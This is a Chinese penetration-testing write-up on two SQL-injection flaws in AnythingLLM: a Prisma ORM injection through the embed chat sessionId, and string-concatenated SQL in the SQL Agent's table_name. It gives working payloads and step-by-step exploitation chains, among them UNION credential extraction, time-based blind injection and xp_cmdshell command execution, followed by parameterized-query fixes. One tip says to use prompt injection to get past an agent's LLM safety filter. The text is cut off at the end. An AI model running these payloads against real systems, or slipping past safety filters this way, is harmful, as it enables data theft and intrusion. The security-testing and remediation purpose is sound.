+<h4 id="攻击链路"><a href="#攻击链路" class="headerlink" title="攻击链路"></a>攻击链路</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1. 攻击者通过对话界面调用 SQL Agent</span><br><span class="line">   &quot;帮我查看 users 表的结构&quot;</span><br><span class="line"></span><br><span class="line">2. LLM 解析意图，调用 getTableSchemaSql(&quot;users&quot;)</span><br><span class="line"></span><br><span class="line">3. 恶意输入：攻击者通过 prompt injection 或直接操控 table_name</span><br><span class="line">   table_name = &quot;users&#x27; UNION SELECT username, password, &#x27;Y&#x27; FROM credentials--&quot;</span><br><span class="line"></span><br><span class="line">4. 拼接后的 SQL：</span><br><span class="line">   SELECT COLUMN_NAME, DATA_TYPE, IS_NULLABLE</span><br><span class="line">   FROM INFORMATION_SCHEMA.COLUMNS</span><br><span class="line">   WHERE TABLE_NAME = &#x27;users&#x27; UNION SELECT username, password, &#x27;Y&#x27; FROM credentials--&#x27;</span><br><span class="line"></span><br><span class="line">5. 数据库执行拼接后的 SQL，返回 credentials 表的用户名和密码</span><br></pre></td></tr></table></figure>
+
+<h4 id="危害-1"><a href="#危害-1" class="headerlink" title="危害"></a>危害</h4><ul>
+<li>任意 SQL 执行：可读取、修改、删除连接数据库中的任何数据</li>
+<li>数据泄露：可导出敏感表数据（用户凭证、业务数据等）</li>
+<li>潜在 RCE：如果数据库配置了 <code>xp_cmdshell</code>（MSSQL）或类似功能，可执行系统命令</li>
+<li>横向移动：获取数据库凭证后可用于攻击内网其他系统</li>
+</ul>
+<h4 id="漏洞判断特征-1"><a href="#漏洞判断特征-1" class="headerlink" title="漏洞判断特征"></a>漏洞判断特征</h4><table>
+<thead>
+<tr>
+<th>特征</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>注入点</td>
+<td><code>table_name</code> 参数</td>
+</tr>
+<tr>
+<td>注入方式</td>
+<td>传统 SQL 注入（字符串拼接）</td>
+</tr>
+<tr>
+<td>影响范围</td>
+<td>连接的外部数据库（MySQL &#x2F; PG &#x2F; MSSQL）</td>
+</tr>
+<tr>
+<td>触发途径</td>
+<td>通过 LLM Agent 对话调用 SQL Agent 插件</td>
+</tr>
+<tr>
+<td>认证要求</td>
+<td>需有调用 Agent 的权限</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="四、漏洞判断方法（渗透测试视角）"><a href="#四、漏洞判断方法（渗透测试视角）" class="headerlink" title="四、漏洞判断方法（渗透测试视角）"></a>四、漏洞判断方法（渗透测试视角）</h2><h3 id="4-1-信息收集阶段"><a href="#4-1-信息收集阶段" class="headerlink" title="4.1 信息收集阶段"></a>4.1 信息收集阶段</h3><p>在判断 AnythingLLM 系统是否存在 SQL 注入前，先确认目标信息：</p>
+<table>
+<thead>
+<tr>
+<th>收集项</th>
+<th>方法</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>版本号</td>
+<td>查看 <code>/api/system/env</code>、页面 footer、HTTP 头</td>
+<td>确认是否在受影响版本范围内</td>
+</tr>
+<tr>
+<td>是否启用 Embed Chat</td>
+<td>访问 <code>/embed</code> 路径</td>
+<td>CVE-2024-8251 的前提</td>
+</tr>
+<tr>
+<td>是否启用 SQL Agent</td>
+<td>查看工作区 Agent 配置</td>
+<td>CVE-2026-32628 的前提</td>
+</tr>
+<tr>
+<td>数据库类型</td>
+<td>错误信息、响应特征</td>
+<td>判断注入语法</td>
+</tr>
+</tbody></table>
+<h3 id="4-2-CVE-2024-8251-判断方法"><a href="#4-2-CVE-2024-8251-判断方法" class="headerlink" title="4.2 CVE-2024-8251 判断方法"></a>4.2 CVE-2024-8251 判断方法</h3><h4 id="步骤-1：确认-Embed-Chat-端点存在"><a href="#步骤-1：确认-Embed-Chat-端点存在" class="headerlink" title="步骤 1：确认 Embed Chat 端点存在"></a>步骤 1：确认 Embed Chat 端点存在</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/embed/&lt;embedId&gt;</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure>
+
+<p>如果返回嵌入聊天页面，说明该功能启用。</p>
+<h4 id="步骤-2：发送正常请求，观察基线响应"><a href="#步骤-2：发送正常请求，观察基线响应" class="headerlink" title="步骤 2：发送正常请求，观察基线响应"></a>步骤 2：发送正常请求，观察基线响应</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/embed/&lt;embedId&gt;/stream-chat</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">    <span class="attr">&quot;sessionId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test-session-001&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">    <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hello&quot;</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>记录响应时间和内容作为基线。</p>
+<h4 id="步骤-3：发送注入测试-Payload"><a href="#步骤-3：发送注入测试-Payload" class="headerlink" title="步骤 3：发送注入测试 Payload"></a>步骤 3：发送注入测试 Payload</h4><p><strong>Payload 1 — 布尔条件测试（返回全表）：</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;sessionId&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;not&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nonexistent&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>&#123;&quot;not&quot;: &quot;nonexistent&quot;&#125;</code> 等价于 <code>sessionId != &#39;nonexistent&#39;</code></li>
+<li>如果返回的数据量明显大于正常请求 → <strong>存在 ORM 注入</strong></li>
+</ul>
+<p><strong>Payload 2 — 始终为真条件：</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;sessionId&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;contains&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>&#123;&quot;contains&quot;: &quot;&quot;&#125;</code> 匹配所有非空 sessionId 的记录</li>
+<li>如果返回多条记录 → <strong>存在注入</strong></li>
+</ul>
+<p><strong>Payload 3 — 对比测试（布尔盲注思路）：</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 请求 A：条件为真</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;sessionId&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;startsWith&quot;</span><span class="punctuation">:</span> <span class="string">&quot;a&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hello&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 请求 B：条件矛盾</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;sessionId&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;not&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;startsWith&quot;</span><span class="punctuation">:</span> <span class="string">&quot;a&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hello&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如果 A 和 B 返回的记录数互补 → 确认注入</li>
+</ul>
+<h4 id="判断结论表"><a href="#判断结论表" class="headerlink" title="判断结论表"></a>判断结论表</h4><table>
+<thead>
+<tr>
+<th>测试结果</th>
+<th>结论</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>传入 JSON 对象后返回数据量异常增加</td>
+<td><strong>存在 Prisma ORM 注入</strong></td>
+</tr>
+<tr>
+<td>传入 JSON 对象报 500 错误</td>
+<td>可能做了部分过滤，需进一步测试</td>
+</tr>
+<tr>
+<td>传入 JSON 对象被当作字符串处理</td>
+<td>已修复（输入类型校验）</td>
+</tr>
+</tbody></table>
+<h3 id="4-3-CVE-2026-32628-判断方法"><a href="#4-3-CVE-2026-32628-判断方法" class="headerlink" title="4.3 CVE-2026-32628 判断方法"></a>4.3 CVE-2026-32628 判断方法</h3><h4 id="步骤-1：确认-SQL-Agent-插件启用"><a href="#步骤-1：确认-SQL-Agent-插件启用" class="headerlink" title="步骤 1：确认 SQL Agent 插件启用"></a>步骤 1：确认 SQL Agent 插件启用</h4><p>需要具备可调用 Agent 的权限。在工作区设置中查看是否配置了 SQL Agent 连接器。</p>
+<h4 id="步骤-2：通过对话触发-SQL-Agent"><a href="#步骤-2：通过对话触发-SQL-Agent" class="headerlink" title="步骤 2：通过对话触发 SQL Agent"></a>步骤 2：通过对话触发 SQL Agent</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户输入：&quot;帮我查看数据库中有哪些表&quot;</span><br></pre></td></tr></table></figure>
+
+<p>Agent 会尝试连接数据库并返回表列表。</p>
+<h4 id="步骤-3：构造恶意表名触发注入"><a href="#步骤-3：构造恶意表名触发注入" class="headerlink" title="步骤 3：构造恶意表名触发注入"></a>步骤 3：构造恶意表名触发注入</h4><p><strong>Payload 1 — 报错注入（判断注入点）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户输入：&quot;查看表名为 users&#x27; 的结构&quot;</span><br></pre></td></tr></table></figure>
+
+<p>如果 <code>table_name</code> 被直接拼接，数据库会返回 SQL 语法错误 → <strong>存在注入</strong></p>
+<p><strong>Payload 2 — UNION 注入（提取数据）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_name = &quot;nonexistent&#x27; UNION SELECT username,password,&#x27;3&#x27; FROM users-- &quot;</span><br></pre></td></tr></table></figure>
+
+<p>拼接后 SQL：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> COLUMN_NAME, DATA_TYPE, IS_NULLABLE</span><br><span class="line"><span class="keyword">FROM</span> INFORMATION_SCHEMA.COLUMNS</span><br><span class="line"><span class="keyword">WHERE</span> TABLE_NAME <span class="operator">=</span> <span class="string">&#x27;nonexistent&#x27;</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> username, password, <span class="string">&#x27;3&#x27;</span> <span class="keyword">FROM</span> users<span class="comment">-- &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果返回了 users 表的用户名和密码 → <strong>确认注入</strong></p>
+<p><strong>Payload 3 — 时间盲注（无回显场景）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># MySQL</span><br><span class="line">table_name = &quot;users&#x27; AND SLEEP(5)-- &quot;</span><br><span class="line"></span><br><span class="line"># PostgreSQL</span><br><span class="line">table_name = &quot;users&#x27;; SELECT pg_sleep(5)-- &quot;</span><br><span class="line"></span><br><span class="line"># MSSQL</span><br><span class="line">table_name = &quot;users&#x27;; WAITFOR DELAY &#x27;0:0:5&#x27;-- &quot;</span><br></pre></td></tr></table></figure>
+
+<p>如果响应延迟 5 秒 → <strong>确认时间盲注</strong></p>
+<h4 id="不同数据库的判断特征"><a href="#不同数据库的判断特征" class="headerlink" title="不同数据库的判断特征"></a>不同数据库的判断特征</h4><table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>报错特征</th>
+<th>时间函数</th>
+<th>信息获取方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MySQL</td>
+<td><code>You have an error in your SQL syntax</code></td>
+<td><code>SLEEP(5)</code></td>
+<td><code>UNION SELECT</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>ERROR: syntax error at or near</code></td>
+<td><code>pg_sleep(5)</code></td>
+<td><code>UNION SELECT</code></td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td><code>Unclosed quotation mark</code></td>
+<td><code>WAITFOR DELAY &#39;0:0:5&#39;</code></td>
+<td><code>UNION SELECT</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="五、漏洞利用实例详解"><a href="#五、漏洞利用实例详解" class="headerlink" title="五、漏洞利用实例详解"></a>五、漏洞利用实例详解</h2><h3 id="5-1-CVE-2024-8251-完整利用链"><a href="#5-1-CVE-2024-8251-完整利用链" class="headerlink" title="5.1 CVE-2024-8251 完整利用链"></a>5.1 CVE-2024-8251 完整利用链</h3><p><strong>场景</strong>：攻击者发现目标网站嵌入了 AnythingLLM 的 Embed Chat，尝试读取所有用户聊天记录。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">目标：https://target.com/embed/abc123/stream-chat</span><br><span class="line"></span><br><span class="line">Step 1: 正常请求（基线）</span><br><span class="line">POST /embed/abc123/stream-chat</span><br><span class="line">&#123;&quot;sessionId&quot;:&quot;s1&quot;,&quot;message&quot;:&quot;hi&quot;&#125;</span><br><span class="line">→ 返回 1 条聊天记录</span><br><span class="line"></span><br><span class="line">Step 2: ORM 注入（全表读取）</span><br><span class="line">POST /embed/abc123/stream-chat</span><br><span class="line">&#123;&quot;sessionId&quot;:&#123;&quot;not&quot;:&quot;____none____&quot;&#125;,&quot;message&quot;:&quot;hi&quot;&#125;</span><br><span class="line">→ 返回 500+ 条聊天记录（所有 session 的记录）</span><br><span class="line"></span><br><span class="line">Step 3: 精准枚举（按条件过滤）</span><br><span class="line">POST /embed/abc123/stream-chat</span><br><span class="line">&#123;&quot;sessionId&quot;:&#123;&quot;contains&quot;:&quot;admin&quot;&#125;,&quot;message&quot;:&quot;hi&quot;&#125;</span><br><span class="line">→ 返回所有 sessionId 包含 &quot;admin&quot; 的记录</span><br><span class="line"></span><br><span class="line">Step 4: 利用 Prisma 操作符组合</span><br><span class="line">POST /embed/abc123/stream-chat</span><br><span class="line">&#123;&quot;sessionId&quot;:&#123;&quot;in&quot;:[&quot;admin-session&quot;,&quot;vip-session&quot;]&#125;,&quot;message&quot;:&quot;hi&quot;&#125;</span><br><span class="line">→ 返回指定 session 的记录</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-CVE-2026-32628-完整利用链"><a href="#5-2-CVE-2026-32628-完整利用链" class="headerlink" title="5.2 CVE-2026-32628 完整利用链"></a>5.2 CVE-2026-32628 完整利用链</h3><p><strong>场景</strong>：攻击者通过 SQL Agent 对话，逐步提取数据库中的敏感信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Step 1: 探测注入点</span><br><span class="line">用户输入：&quot;查看表名为 test&#x27; 的表结构&quot;</span><br><span class="line">→ 数据库报错：SQL syntax error</span><br><span class="line">→ 确认 table_name 存在 SQL 注入</span><br><span class="line"></span><br><span class="line">Step 2: 获取数据库版本</span><br><span class="line">table_name = &quot;x&#x27; UNION SELECT version(), &#x27;type&#x27;,&#x27;Y&#x27;-- &quot;</span><br><span class="line">→ 返回：MySQL 8.0.35</span><br><span class="line"></span><br><span class="line">Step 3: 枚举所有表名</span><br><span class="line">table_name = &quot;x&#x27; UNION SELECT table_name,&#x27;type&#x27;,&#x27;Y&#x27; FROM information_schema.tables WHERE table_schema=database()-- &quot;</span><br><span class="line">→ 返回：users, orders, credentials, config...</span><br><span class="line"></span><br><span class="line">Step 4: 提取 credentials 表数据</span><br><span class="line">table_name = &quot;x&#x27; UNION SELECT username,password,&#x27;Y&#x27; FROM credentials-- &quot;</span><br><span class="line">→ 返回：</span><br><span class="line">   admin | $2a$10$xxxxx...</span><br><span class="line">   root  | $2a$10$yyyyy...</span><br><span class="line"></span><br><span class="line">Step 5: 如果是 MSSQL，尝试命令执行</span><br><span class="line">table_name = &quot;x&#x27;; EXEC xp_cmdshell &#x27;whoami&#x27;-- &quot;</span><br><span class="line">→ 如果 xp_cmdshell 开启，可执行系统命令</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、修复方案与防御措施"><a href="#六、修复方案与防御措施" class="headerlink" title="六、修复方案与防御措施"></a>六、修复方案与防御措施</h2><h3 id="6-1-CVE-2024-8251-修复"><a href="#6-1-CVE-2024-8251-修复" class="headerlink" title="6.1 CVE-2024-8251 修复"></a>6.1 CVE-2024-8251 修复</h3><p><strong>修复方式</strong>：对 <code>sessionId</code> 进行严格的类型校验，确保只接受字符串类型。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修复后代码</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/embed/:embedId/stream-chat&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; sessionId, message &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修复1：类型校验，确保 sessionId 是字符串</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> sessionId !== <span class="string">&#x27;string&#x27;</span> || sessionId.<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid sessionId&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修复2：限制 sessionId 格式（可选）</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="regexp">/^[a-zA-Z0-9-]+$/</span>.<span class="title function_">test</span>(sessionId)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid sessionId format&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> chatHistory = <span class="keyword">await</span> prisma.<span class="property">embed_chats</span>.<span class="title function_">findMany</span>(&#123;</span><br><span class="line">        <span class="attr">where</span>: &#123;</span><br><span class="line">            <span class="attr">embedId</span>: req.<span class="property">params</span>.<span class="property">embedId</span>,</span><br><span class="line">            <span class="attr">sessionId</span>: sessionId  <span class="comment">// 此时已确保是安全字符串</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-CVE-2026-32628-修复"><a href="#6-2-CVE-2026-32628-修复" class="headerlink" title="6.2 CVE-2026-32628 修复"></a>6.2 CVE-2026-32628 修复</h3><p><strong>修复方式</strong>：使用参数化查询替代字符串拼接。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修复后代码 - MySQL 连接器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MySQLConnector</span> &#123;</span><br><span class="line">    <span class="title function_">getTableSchemaSql</span>(<span class="params">tableName</span>) &#123;</span><br><span class="line">        <span class="comment">// 修复：使用参数化查询</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">sql</span>: <span class="string">`SELECT COLUMN_NAME, DATA_TYPE, IS_NULLABLE</span></span><br><span class="line"><span class="string">                  FROM INFORMATION_SCHEMA.COLUMNS</span></span><br><span class="line"><span class="string">                  WHERE TABLE_NAME = ?`</span>,</span><br><span class="line">            <span class="attr">params</span>: [tableName]</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修复后代码 - PostgreSQL 连接器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PostgresConnector</span> &#123;</span><br><span class="line">    <span class="title function_">getTableSchemaSql</span>(<span class="params">tableName</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">sql</span>: <span class="string">`SELECT column_name, data_type, is_nullable</span></span><br><span class="line"><span class="string">                  FROM information_schema.columns</span></span><br><span class="line"><span class="string">                  WHERE table_name = $1`</span>,</span><br><span class="line">            <span class="attr">params</span>: [tableName]</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-纵深防御措施"><a href="#6-3-纵深防御措施" class="headerlink" title="6.3 纵深防御措施"></a>6.3 纵深防御措施</h3><table>
+<thead>
+<tr>
+<th>防御层</th>
+<th>措施</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>输入层</td>
+<td>类型校验 + 格式白名单</td>
+<td>所有用户输入强制类型检查</td>
+</tr>
+<tr>
+<td>ORM 层</td>
+<td>禁止将用户 JSON 直接传入 where</td>
+<td>使用显式字段映射</td>
+</tr>
+<tr>
+<td>查询层</td>
+<td>全部使用参数化查询</td>
+<td>禁止 <code>$queryRawUnsafe</code></td>
+</tr>
+<tr>
+<td>数据库层</td>
+<td>最小权限原则</td>
+<td>Agent 连接的数据库账号仅授予 SELECT 权限</td>
+</tr>
+<tr>
+<td>网络层</td>
+<td>SQL Agent 连接的数据库部署在内网</td>
+<td>禁止直接暴露到公网</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="七、渗透测试中的实战判断技巧"><a href="#七、渗透测试中的实战判断技巧" class="headerlink" title="七、渗透测试中的实战判断技巧"></a>七、渗透测试中的实战判断技巧</h2><h3 id="7-1-快速判断清单"><a href="#7-1-快速判断清单" class="headerlink" title="7.1 快速判断清单"></a>7.1 快速判断清单</h3><p>当你在渗透测试中遇到 AnythingLLM 实例时，按以下清单快速判断：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">□ 1. 确认版本（&lt; 1.2.2 → 测 CVE-2024-8251；≤ 1.11.1 → 测 CVE-2026-32628）</span><br><span class="line">□ 2. 探测 /embed 端点是否可访问</span><br><span class="line">□ 3. 如果可访问，尝试 Prisma ORM 注入</span><br><span class="line">□ 4. 检查是否有 SQL Agent 可调用</span><br><span class="line">□ 5. 如果有，尝试 table_name SQL 注入</span><br><span class="line">□ 6. 根据数据库类型选择对应注入语法</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-2-两个漏洞的对比总结"><a href="#7-2-两个漏洞的对比总结" class="headerlink" title="7.2 两个漏洞的对比总结"></a>7.2 两个漏洞的对比总结</h3><table>
+<thead>
+<tr>
+<th>维度</th>
+<th>CVE-2024-8251</th>
+<th>CVE-2026-32628</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>漏洞类型</td>
+<td>ORM 注入（Prisma）</td>
+<td>传统 SQL 注入</td>
+</tr>
+<tr>
+<td>根因</td>
+<td>JSON 直接传入 where 条件</td>
+<td>字符串拼接 SQL</td>
+</tr>
+<tr>
+<td>注入点</td>
+<td><code>sessionId</code> 字段</td>
+<td><code>table_name</code> 参数</td>
+</tr>
+<tr>
+<td>注入方式</td>
+<td>传入 JSON 操作符对象</td>
+<td>传入 SQL 特殊字符</td>
+</tr>
+<tr>
+<td>认证要求</td>
+<td>无需认证</td>
+<td>需低权限</td>
+</tr>
+<tr>
+<td>危害等级</td>
+<td>中等（信息泄露）</td>
+<td>高危（任意 SQL 执行）</td>
+</tr>
+<tr>
+<td>影响范围</td>
+<td>内部聊天记录</td>
+<td>连接的外部数据库</td>
+</tr>
+<tr>
+<td>修复方式</td>
+<td>输入类型校验</td>
+<td>参数化查询</td>
+</tr>
+</tbody></table>
+<h3 id="7-3-常见误判与注意事项"><a href="#7-3-常见误判与注意事项" class="headerlink" title="7.3 常见误判与注意事项"></a>7.3 常见误判与注意事项</h3><table>
+<thead>
+<tr>
+<th>误判场景</th>
+<th>正确判断方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>传入 JSON 对象返回 500</td>
+<td>不一定是修复，可能是 ORM 内部错误，尝试不同操作符</td>
+</tr>
+<tr>
+<td>SQL Agent 无回显</td>
+<td>可能是盲注，改用时间注入判断</td>
+</tr>
+<tr>
+<td>Prisma 报错信息不明确</td>
+<td>对比正常请求和注入请求的响应差异，而非依赖报错</td>
+</tr>
+<tr>
+<td>Agent 拒绝执行某些查询</td>
+<td>可能是 LLM 安全过滤，尝试 prompt injection 绕过</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="八、知识扩展：ORM-注入-vs-传统-SQL-注入"><a href="#八、知识扩展：ORM-注入-vs-传统-SQL-注入" class="headerlink" title="八、知识扩展：ORM 注入 vs 传统 SQL 注入"></a>八、知识扩展：ORM 注入 vs 传统 SQL 注入</h2><h3 id="核心区别"><a href="#核心区别" class="headerlink" title="核心区别"></a>核心区别</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">传统 SQL 注入：</span><br><span class="line">  用户输入 → 直接拼接 SQL 字符串 → 数据库执行</span><br><span class="line">  示例: &quot;users&#x27; OR &#x27;1&#x27;=&#x27;1&quot; → SELECT * FROM users WHERE name = &#x27;users&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">ORM 注入：</span><br><span class="line">  用户输入 → 